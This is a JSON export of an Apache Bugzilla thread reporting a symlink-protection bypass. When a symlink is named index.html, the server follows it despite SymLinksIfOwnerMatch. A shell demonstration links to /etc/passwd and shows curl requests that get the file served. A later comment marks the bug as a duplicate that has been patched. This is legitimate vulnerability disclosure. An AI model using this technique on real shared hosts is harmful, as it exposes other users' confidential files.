[{"count": 0, "text": "Apache ignores SymLinksIfOwnerMatch- and FollowSymlinks-directives if the name of the symlink in question matches a valid value for DirectoryIndex.\n\n\nExpected behaviour: 403 Forbidden, the symlink's target should not be delivered.\n\nObserved behaviour: 200 OK, the symlink's target is delivered to the client.\n\n\nImpact: this could prove a security problem, especially in shared hosting environments. It is possible to disclose confidential information by arbitrarily creating symlinks to files readable by the apache process.\n\n\nDemonstration:\n--- snip ---\nxy@v1384:~/dev/test$ ls -la . /etc/passwd\n-rw-r--r-- 1 root root 1570 2009-03-23 11:06 /etc/passwd\n\n.:\ntotal 3\ndrwxr-xr-x 2 xy xy 1024 2009-06-09 16:50 .\ndrwxr-xr-x 5 xy xy 1024 2009-06-09 16:31 ..\n-rw-r--r-- 1 xy xy   29 2009-06-09 16:48 .htaccess\nlrwxrwxrwx 1 xy xy   11 2009-06-09 16:47 index.html -> /etc/passwd\nlrwxrwxrwx 1 xy xy   11 2009-06-09 16:50 symlink -> /etc/passwd\n\nxy@v1384:~/dev/test$ cat .htaccess\nOptions SymLinksIfOwnerMatch\n\nxy@v1384:~/dev/test$ curl --head http://dev.truschnigg.info/test/symlink\nHTTP/1.1 403 Forbidden\nDate: Tue, 09 Jun 2009 15:36:52 GMT\nServer: Apache\nContent-Type: text/html; charset=iso-8859-1\n\nxy@v1384:~/dev/test$ curl --head http://dev.truschnigg.info/test/index.html\nHTTP/1.1 403 Forbidden\nDate: Tue, 09 Jun 2009 15:37:00 GMT\nServer: Apache\nContent-Type: text/html; charset=iso-8859-1\n\nxy@v1384:~/dev/test$ curl --head http://dev.truschnigg.info/test/\nHTTP/1.1 200 OK\nDate: Tue, 09 Jun 2009 15:37:03 GMT\nServer: Apache\nLast-Modified: Mon, 23 Mar 2009 10:06:27 GMT\nETag: \"f979d3e-622-465c66b6bcec0\"\nAccept-Ranges: bytes\nContent-Length: 1570\nContent-Type: text/html\n--- snip ---\n\n\nThe above behaviour is the same if FollowSymlinks, instead of SymLinksIfOwnerMatch, is used to restrict access.\nThis is reproducible on Apache 2.2.9 (Debian Stable) and 2.2.11 (Gentoo ~x86).", "bug_id": 47337, "attachment_id": null, "id": 127763, "time": "2009-06-09T09:07:05Z", "creator": "johannes+bugs@truschnigg.info", "creation_time": "2009-06-09T09:07:05Z", "tags": [], "is_private": false}, {"count": 1, "tags": [], "bug_id": 47337, "attachment_id": null, "text": "This looks like a dupe of bug 45959. A patch was applied in r733754 to the 2.2 branch, which should fix the issue since vers. 2.2.12 (not released yet).\n\n*** This bug has been marked as a duplicate of bug 45959 ***", "id": 127863, "time": "2009-06-11T04:42:52Z", "creator": "bobsiegen@googlemail.com", "creation_time": "2009-06-11T04:42:52Z", "is_private": false}]